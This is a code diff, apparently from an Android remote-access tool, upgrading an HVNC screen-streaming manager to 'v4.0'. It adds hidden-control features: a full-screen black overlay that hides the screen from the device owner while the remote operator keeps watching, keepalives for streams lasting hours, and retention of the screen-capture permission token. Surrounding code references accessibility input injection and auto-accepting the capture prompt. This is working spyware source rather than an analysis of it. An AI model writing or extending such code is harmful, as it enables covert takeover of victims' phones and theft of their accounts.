@@ -7,6 +7,7 @@ import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
 import android.media.MediaCodec;
 import android.media.MediaCodecInfo;
+import android.media.MediaCodecList;
 import android.media.MediaFormat;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
@@ -14,6 +15,9 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.util.Log;
+import android.view.WindowManager;
+import android.graphics.PixelFormat;
+import android.view.View;
 import com.fason.app.core.FasonApp;
 import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
@@ -33,7 +37,17 @@ public final class HVncManager {
     private static final int DEFAULT_SCALE_PERCENT = 50;
     private static final int MAX_FRAME_SIZE = 512 * 1024;
     private static final int CHUNK_SIZE = 64 * 1024;
-    private static final int MAX_DECODE_QUEUE = 5;
+    // v4.0: reduced from 5 to 2 — less buffering = lower latency
+    private static final int MAX_DECODE_QUEUE = 2;
+    // v4.0: keepalive keyframe request every 30s for 9-hour stream stability
+    private static final long KEEPALIVE_INTERVAL_MS = 30_000;
+    // v4.0: adaptive bitrate — reduce 15% when queue backs up 3 consecutive checks
+    private static final int ADAPTIVE_BACKPRESSURE_THRESHOLD = 3;
+    private static final float ADAPTIVE_BITRATE_DOWN_FACTOR = 0.85f;
+    private static final float ADAPTIVE_BITRATE_UP_FACTOR   = 1.10f;
+    private static final int MIN_BITRATE = 200_000;
+    private static final int MAX_BITRATE = 8_000_000;
+
     private static volatile HVncManager instance;
     private final Object lock = new Object();
     private MediaProjection mediaProjection;
@@ -46,6 +60,7 @@ public final class HVncManager {
     private volatile boolean streaming = false;
     private volatile int fps = DEFAULT_FPS;
     private volatile int bitrate = 1_500_000;
+    private volatile int currentBitrate = 1_500_000;
     private volatile int scalePercent = DEFAULT_SCALE_PERCENT;
     private volatile int screenWidth = 0;
     private volatile int screenHeight = 0;
@@ -61,6 +76,17 @@ public final class HVncManager {
     private volatile int pendingScale = DEFAULT_SCALE_PERCENT;
     private volatile String pendingCmdId = null;
     private volatile boolean hasPendingStart = false;
+    // v4.0: codec mimeType field (h264 or h265)
+    private volatile String activeCodecMime = MediaFormat.MIMETYPE_VIDEO_AVC;
+    // v4.0: black screen overlay
+    private volatile boolean blackScreenActive = false;
+    private volatile View blackScreenView = null;
+    // v4.0: adaptive bitrate backpressure counter
+    private final AtomicInteger backpressureCount = new AtomicInteger(0);
+    // v4.0: keepalive handler
+    private HandlerThread keepaliveThread;
+    private Handler keepaliveHandler;
+
     private final BlockingQueue<EncodedFrame> frameQueue = new LinkedBlockingQueue<>(MAX_DECODE_QUEUE);
     private volatile Thread senderThread = null;
     private volatile boolean senderRunning = false;
@@ -93,6 +119,22 @@ public final class HVncManager {
             }
         }
         return instance;
+    }
+
+    // v4.0: check if H.265 encoder is available on this device
+    private static boolean isHevcSupported() {
+        try {
+            MediaCodecList list = new MediaCodecList(MediaCodecList.SECURE_CODECS);
+            MediaFormat testFormat = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_HEVC, 1280, 720);
+            testFormat.setInteger(MediaFormat.KEY_BIT_RATE, 2_000_000);
+            testFormat.setInteger(MediaFormat.KEY_FRAME_RATE, 30);
+            testFormat.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
+            testFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1);
+            String codecName = list.findEncoderForFormat(testFormat);
+            return codecName != null;
+        } catch (Exception e) {
+            return false;
+        }
     }
 
     public void setProjectionResult(int code, Intent data) {
@@ -155,6 +197,127 @@ public final class HVncManager {
         return (int) (300_000 + (quality - 10) * (3_000_000 - 300_000) / 90.0);
     }
 
+    // v4.0: adaptive bitrate — reduce when sender queue backs up
+    private void adaptBitrate(boolean reduce) {
+        if (encoder == null) return;
+        try {
+            int next;
+            if (reduce) {
+                next = Math.max(MIN_BITRATE, (int)(currentBitrate * ADAPTIVE_BITRATE_DOWN_FACTOR));
+            } else {
+                next = Math.min(MAX_BITRATE, (int)(currentBitrate * ADAPTIVE_BITRATE_UP_FACTOR));
+            }
+            if (next == currentBitrate) return;
+            currentBitrate = next;
+            android.os.Bundle params = new android.os.Bundle();
+            params.putInt(MediaCodec.PARAMETER_KEY_VIDEO_BITRATE, currentBitrate);
+            encoder.setParameters(params);
+            Log.d(TAG, "Adaptive bitrate → " + currentBitrate / 1000 + "kbps");
+        } catch (Exception ignored) {}
+    }
+
+    // v4.0: keepalive runnable — requests sync frame every 30s
+    private final Runnable keepaliveTask = new Runnable() {
+        @Override
+        public void run() {
+            if (!streaming || encoder == null) return;
+            try {
+                android.os.Bundle params = new android.os.Bundle();
+                params.putInt(MediaCodec.PARAMETER_KEY_REQUEST_SYNC_FRAME, 0);
+                encoder.setParameters(params);
+                Log.d(TAG, "HVNC keepalive keyframe requested");
+            } catch (Exception ignored) {}
+            if (streaming && keepaliveHandler != null) {
+                keepaliveHandler.postDelayed(this, KEEPALIVE_INTERVAL_MS);
+            }
+        }
+    };
+
+    private void startKeepalive() {
+        if (keepaliveThread == null || !keepaliveThread.isAlive()) {
+            keepaliveThread = new HandlerThread("HVncKeepalive");
+            keepaliveThread.start();
+            keepaliveHandler = new Handler(keepaliveThread.getLooper());
+        }
+        keepaliveHandler.removeCallbacks(keepaliveTask);
+        keepaliveHandler.postDelayed(keepaliveTask, KEEPALIVE_INTERVAL_MS);
+    }
+
+    private void stopKeepalive() {
+        if (keepaliveHandler != null) keepaliveHandler.removeCallbacks(keepaliveTask);
+        if (keepaliveThread != null) {
+            try { keepaliveThread.quitSafely(); } catch (Exception ignored) {}
+            keepaliveThread = null;
+        }
+        keepaliveHandler = null;
+    }
+
+    // v4.0: black screen — put a black overlay on device screen
+    public void setBlackScreen(boolean on, String cmdId) {
+        try {
+            Context ctx = FasonApp.getContext();
+            WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
+            if (wm == null) {
+                sendBlackScreenResult(false, "no window manager", cmdId);
+                return;
+            }
+            if (on && blackScreenView == null) {
+                blackScreenView = new View(ctx);
+                blackScreenView.setBackgroundColor(0xFF000000);
+                int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                    : WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
+                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    WindowManager.LayoutParams.MATCH_PARENT,
+                    type,
+                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
+                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                    PixelFormat.OPAQUE
+                );
+                params.alpha = 1.0f;
+                new Handler(android.os.Looper.getMainLooper()).post(() -> {
+                    try {
+                        wm.addView(blackScreenView, params);
+                        blackScreenActive = true;
+                        sendBlackScreenResult(true, null, cmdId);
+                    } catch (Exception e) {
+                        blackScreenView = null;
+                        sendBlackScreenResult(false, e.getMessage(), cmdId);
+                    }
+                });
+            } else if (!on && blackScreenView != null) {
+                final View v = blackScreenView;
+                blackScreenView = null;
+                new Handler(android.os.Looper.getMainLooper()).post(() -> {
+                    try {
+                        wm.removeView(v);
+                    } catch (Exception ignored) {}
+                    blackScreenActive = false;
+                    sendBlackScreenResult(false, null, cmdId);
+                });
+            } else {
+                sendBlackScreenResult(on, null, cmdId);
+            }
+        } catch (Exception e) {
+            sendBlackScreenResult(false, e.getMessage(), cmdId);
+        }
+    }
+
+    private void sendBlackScreenResult(boolean active, String error, String cmdId) {
+        Socket socket = SocketClient.getInstance().getSocket();
+        if (socket == null) return;
+        try {
+            JSONObject d = new JSONObject();
+            d.put(Protocol.KEY_TYPE, "black_screen_result");
+            d.put(Protocol.KEY_BLACK_SCREEN, active);
+            if (error != null) d.put(Protocol.KEY_ERROR, error);
+            if (cmdId != null) d.put(Protocol.KEY_CMD_ID, cmdId);
+            socket.emit(Protocol.HVNC, d);
+        } catch (Exception ignored) {}
+    }
+
     @SuppressLint("WrongConstant")
     public void start(int fps, int quality, int scalePercent, String cmdId) {
         synchronized (lock) {
@@ -172,8 +335,14 @@ public final class HVncManager {
             }
             this.fps = Math.max(1, Math.min(fps > 0 ? fps : DEFAULT_FPS, 60));
             this.bitrate = qualityToBitrate(quality);
+            this.currentBitrate = this.bitrate;
             this.scalePercent = Math.max(10, Math.min(scalePercent > 0 ? scalePercent : DEFAULT_SCALE_PERCENT, 100));
             this.iframeInterval = Math.max(0, Math.min(this.iframeInterval, 10));
+            // v4.0: pick best available codec
+            this.activeCodecMime = isHevcSupported()
+                ? MediaFormat.MIMETYPE_VIDEO_HEVC
+                : MediaFormat.MIMETYPE_VIDEO_AVC;
+            Log.i(TAG, "Using codec: " + activeCodecMime);
             try {
                 Context ctx = FasonApp.getContext();
                 com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
@@ -206,9 +375,20 @@ public final class HVncManager {
                 inputScaleX = (float) screenWidth / targetWidth;
                 inputScaleY = (float) screenHeight / targetHeight;
                 if (!createAndStartEncoder(targetWidth, targetHeight)) {
-                    sendStatus("encoder_failed", cmdId);
-                    stopInternal(true);
-                    return;
+                    // v4.0: if preferred codec failed, retry with H.264
+                    if (!activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_AVC)) {
+                        Log.w(TAG, "HEVC failed, falling back to H.264");
+                        activeCodecMime = MediaFormat.MIMETYPE_VIDEO_AVC;
+                        if (!createAndStartEncoder(targetWidth, targetHeight)) {
+                            sendStatus("encoder_failed", cmdId);
+                            stopInternal(true);
+                            return;
+                        }
+                    } else {
+                        sendStatus("encoder_failed", cmdId);
+                        stopInternal(true);
+                        return;
+                    }
                 }
                 if (virtualDisplay == null) {
                     sendStatus("virtual_display_failed", cmdId);
@@ -219,6 +399,7 @@ public final class HVncManager {
                 stopRequested = false;
                 stopQueued = false;
                 frameQueue.clear();
+                backpressureCount.set(0);
                 Socket socket = SocketClient.getInstance().getSocket();
                 if (socket != null) {
                     disconnectListener = args -> {
@@ -245,9 +426,12 @@ public final class HVncManager {
                 }
                 streaming = true;
                 startSenderThread();
+                // v4.0: start keepalive
+                startKeepalive();
                 sendStatus("streaming", cmdId);
                 Log.i(TAG, "HVNC streaming " + targetWidth + "x" + targetHeight
-                    + " @" + this.fps + "fps " + (this.bitrate / 1000) + "kbps");
+                    + " @" + this.fps + "fps " + (this.currentBitrate / 1000) + "kbps ["
+                    + (activeCodecMime.contains("hevc") ? "H.265" : "H.264") + "]");
             } catch (Exception e) {
                 Log.e(TAG, "HVNC start failed", e);
                 sendStatus("error: " + e.getMessage(), cmdId);
@@ -260,15 +444,52 @@ public final class HVncManager {
         synchronized (lock) {
             if (restartInProgress) {
                 stopRequested = true;
-                Log.i(TAG, "Stop during restart, aborting");
                 return;
             }
             if (!streaming && mediaProjection == null && encoder == null
                 && encoderThread == null && cbThread == null && disconnectListener == null) {
-                Log.i(TAG, "Stop called, nothing active");
                 return;
             }
             stopInternal(true);
+        }
+    }
+
+    // v4.0: retain projection token across stops (for faster restart)
+    public void retainToken() {
+        synchronized (lock) {
+            boolean wasStreaming = streaming;
+            streaming = false;
+            stopRequested = false;
+            stopQueued = false;
+            codecConfigSent = false;
+            stopKeepalive();
+            stopSenderThread();
+            frameQueue.clear();
+            releaseEncoderAndDisplay();
+            if (encoderThread != null) { encoderThread.quitSafely(); encoderThread = null; }
+            encoderHandler = null;
+            try {
+                if (mediaProjection != null) {
+                    Socket socket = SocketClient.getInstance().getSocket();
+                    if (socket != null) {
+                        if (disconnectListener != null) socket.off(Socket.EVENT_DISCONNECT, disconnectListener);
+                        if (connectListener != null) socket.off(Socket.EVENT_CONNECT, connectListener);
+                    }
+                    disconnectListener = null;
+                    connectListener = null;
+                    if (projectionCallback != null) {
+                        try { mediaProjection.unregisterCallback(projectionCallback); } catch (Exception ignored) {}
+                    }
+                    projectionCallback = null;
+                    mediaProjection.stop();
+                }
+            } catch (Exception ignored) {}
+            mediaProjection = null;
+            if (cbThread != null) { try { cbThread.quitSafely(); } catch (Exception ignored) {} cbThread = null; }
+            // NOTE: token (resultCode / resultData) is deliberately NOT cleared
+            com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
+            if (svc != null) svc.downgradeFromMediaProjection();
+            if (wasStreaming) sendStatus("stopped", null);
         }
     }
 
@@ -278,6 +499,7 @@ public final class HVncManager {
         stopRequested = false;
         stopQueued = false;
         codecConfigSent = false;
+        stopKeepalive();
         stopSenderThread();
         frameQueue.clear();
         releaseEncoderAndDisplay();
@@ -287,12 +509,8 @@ public final class HVncManager {
             if (mediaProjection != null) {
                 Socket socket = SocketClient.getInstance().getSocket();
                 if (socket != null) {
-                    if (disconnectListener != null) {
-                        socket.off(Socket.EVENT_DISCONNECT, disconnectListener);
-                    }
-                    if (connectListener != null) {
-                        socket.off(Socket.EVENT_CONNECT, connectListener);
-                    }
+                    if (disconnectListener != null) socket.off(Socket.EVENT_DISCONNECT, disconnectListener);
+                    if (connectListener != null) socket.off(Socket.EVENT_CONNECT, connectListener);
                 }
                 disconnectListener = null;
                 connectListener = null;
@@ -312,6 +530,8 @@ public final class HVncManager {
             inputScaleY = 1f;
             iframeInterval = 0;
         }
+        // v4.0: remove black screen if streaming stops
+        if (blackScreenActive) setBlackScreen(false, null);
         com.fason.app.service.MainService svc = com.fason.app.service.MainService.getInstance();
         if (svc != null) svc.downgradeFromMediaProjection();
         if (wasStreaming && clearToken) sendStatus("stopped", null);
@@ -332,11 +552,13 @@ public final class HVncManager {
             try {
                 this.fps = Math.max(1, Math.min(fps > 0 ? fps : this.fps, 60));
                 this.bitrate = qualityToBitrate(quality);
+                this.currentBitrate = this.bitrate;
                 this.scalePercent = Math.max(10, Math.min(scalePercent > 0 ? scalePercent : this.scalePercent, 100));
-                Log.i(TAG, "Restarting encoder: " + this.fps + "fps " + (this.bitrate / 1000) + "kbps");
                 streaming = false;
+                stopKeepalive();
                 stopSenderThread();
                 frameQueue.clear();
+                backpressureCount.set(0);
                 releaseEncoderAndDisplay();
                 Context ctx = FasonApp.getContext();
                 int[] dims = computeDimensions(ctx);
@@ -346,9 +568,18 @@ public final class HVncManager {
                 inputScaleX = (float) screenWidth / targetWidth;
                 inputScaleY = (float) screenHeight / targetHeight;
                 if (!createAndStartEncoder(targetWidth, targetHeight)) {
-                    sendStatus("encoder_failed", cmdId);
-                    stopInternal(false);
-                    return;
+                    if (!activeCodecMime.equals(MediaFormat.MIMETYPE_VIDEO_AVC)) {
+                        activeCodecMime = MediaFormat.MIMETYPE_VIDEO_AVC;
+                        if (!createAndStartEncoder(targetWidth, targetHeight)) {
+                            sendStatus("encoder_failed", cmdId);
+                            stopInternal(false);
+                            return;
+                        }
+                    } else {
+                        sendStatus("encoder_failed", cmdId);
+                        stopInternal(false);
+                        return;
+                    }
                 }
                 if (virtualDisplay == null) {
                     sendStatus("virtual_display_failed", cmdId);
@@ -356,15 +587,14 @@ public final class HVncManager {
                     return;
                 }
                 if (stopRequested) {
-                    Log.i(TAG, "Stop during restart");
                     stopInternal(false);
                     return;
                 }
                 codecConfigSent = false;
                 streaming = true;
                 startSenderThread();
+                startKeepalive();
                 sendStatus("streaming", cmdId);
-                Log.i(TAG, "HVNC restarted " + targetWidth + "x" + targetHeight);
             } catch (Exception e) {
                 Log.e(TAG, "Restart failed", e);
                 sendStatus("error: restart " + e.getMessage(), cmdId);
@@ -395,9 +625,9 @@ public final class HVncManager {
 
     private boolean createAndStartEncoder(int targetWidth, int targetHeight) {
         try {
-            MediaFormat format = MediaFormat.createVideoFormat(MediaFormat.MIMETYPE_VIDEO_AVC, targetWidth, targetHeight);
+            MediaFormat format = MediaFormat.createVideoFormat(activeCodecMime, targetWidth, targetHeight);
             format.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatSurface);
-            format.setInteger(MediaFormat.KEY_BIT_RATE, this.bitrate);
+            format.setInteger(MediaFormat.KEY_BIT_RATE, this.currentBitrate);
             format.setInteger(MediaFormat.KEY_FRAME_RATE, this.fps);
             format.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, iframeInterval);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
@@ -406,7 +636,9 @@ public final class HVncManager {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 format.setInteger(MediaFormat.KEY_PRIORITY, 0);
             }
-            encoder = MediaCodec.createEncoderByType(MediaFormat.MIMETYPE_VIDEO_AVC);
+            // v4.0: hint to encoder for lowest latency (works on some Qualcomm/MTK)
+            try { format.setInteger("vendor.qti-ext-enc-low-latency.enable", 1); } catch (Exception ignored) {}
+            encoder = MediaCodec.createEncoderByType(activeCodecMime);
             encoder.setCallback(new EncoderCallback(), encoderHandler);
             encoder.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE);
             encoderInputSurface = encoder.createInputSurface();
@@ -420,7 +652,7 @@ public final class HVncManager {
             );
             return virtualDisplay != null;
         } catch (Exception e) {
-            Log.e(TAG, "Encoder creation failed", e);
+            Log.e(TAG, "Encoder creation failed (" + activeCodecMime + ")", e);
             return false;
         }
     }
@@ -457,14 +689,13 @@ public final class HVncManager {
                 outBuf.limit(info.offset + info.size);
                 outBuf.get(annexB);
                 byte[] avcc = annexBToLengthPrefixed(annexB);
-                if (avcc == null) {
-                    codec.releaseOutputBuffer(index, false);
-                    return;
-                }
+                if (avcc == null) { codec.releaseOutputBuffer(index, false); return; }
                 boolean keyframe = (info.flags & MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0;
                 EncodedFrame frame = new EncodedFrame(avcc, info.presentationTimeUs, keyframe);
+                // v4.0: drop oldest frame if queue is full (prefer new over old)
                 if (!frameQueue.offer(frame)) {
-                    Log.d(TAG, "Frame dropped, queue full");
+                    frameQueue.poll(); // drop oldest
+                    frameQueue.offer(frame);
                 }
             }
             codec.releaseOutputBuffer(index, false);
@@ -494,8 +725,10 @@ public final class HVncManager {
         }
     }
 
-    public boolean isStreaming() {
-        return streaming;
+    public boolean isStreaming() { return streaming; }
+    public boolean isBlackScreenActive() { return blackScreenActive; }
+    public String getActiveCodec() {
+        return activeCodecMime.contains("hevc") ? "h265" : "h264";
     }
 
     private void sendCodecConfig(byte[] annexBConfig) {
@@ -514,6 +747,8 @@ public final class HVncManager {
             meta.put(Protocol.KEY_WIDTH, encodedWidth);
             meta.put(Protocol.KEY_HEIGHT, encodedHeight);
             meta.put(Protocol.KEY_FPS, fps);
+            // v4.0: include codec type so frontend knows whether to use avc1 or hev1
+            meta.put(Protocol.KEY_CODEC, getActiveCodec());
             meta.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
             Object[] args = new Object[] { meta, avcC };
             socket.emit(Protocol.HVNC, args);
@@ -613,6 +848,8 @@ public final class HVncManager {
             if (senderRunning && senderThread != null) return;
             senderRunning = true;
             senderThread = new Thread(() -> {
+                // v4.0: max priority for sender thread — reduces frame drop under CPU load
+                android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_URGENT_DISPLAY);
                 while (senderRunning) {
                     try {
                         EncodedFrame frame = frameQueue.poll(200, TimeUnit.MILLISECONDS);
@@ -620,6 +857,18 @@ public final class HVncManager {
                         if (!streaming) continue;
                         Socket socket = SocketClient.getInstance().getSocket();
                         if (socket == null || !socket.connected()) continue;
+                        // v4.0: adaptive bitrate check
+                        int qSize = frameQueue.size();
+                        if (qSize >= MAX_DECODE_QUEUE) {
+                            if (backpressureCount.incrementAndGet() >= ADAPTIVE_BACKPRESSURE_THRESHOLD) {
+                                adaptBitrate(true);
+                                backpressureCount.set(0);
+                            }
+                        } else {
+                            backpressureCount.set(0);
+                            // slow recovery upward only when queue is empty
+                            if (qSize == 0) adaptBitrate(false);
+                        }
                         if (frame.data.length > MAX_FRAME_SIZE) {
                             sendStatus("frame_dropped_oversized", null);
                             continue;
@@ -690,16 +939,17 @@ public final class HVncManager {
             data.put("accessibilityEnabled", InputInjector.isEnabled());
             data.put("accessibilityConnected", HVncAccessibilityService.isServiceConnected());
             data.put("projectionReady", hasProjectionPermission());
-            data.put("codec", "h264");
+            // v4.0: include active codec and black screen state
+            data.put(Protocol.KEY_CODEC, getActiveCodec());
+            data.put(Protocol.KEY_BLACK_SCREEN, blackScreenActive);
+            data.put("currentBitrate", currentBitrate);
             if (cmdId != null) data.put(Protocol.KEY_CMD_ID, cmdId);
             socket.emit(Protocol.HVNC, data);
         } catch (Exception ignored) {}
     }
 
     public void onAutoAcceptResult(boolean success, String reason) {
-        if (success) {
-            Log.i(TAG, "Auto-accept ok");
-        } else {
+        if (!success) {
             Log.w(TAG, "Auto-accept failed: " + reason);
             sendStatus("auto_accept_failed:" + (reason == null ? "unknown" : reason), null);
         }
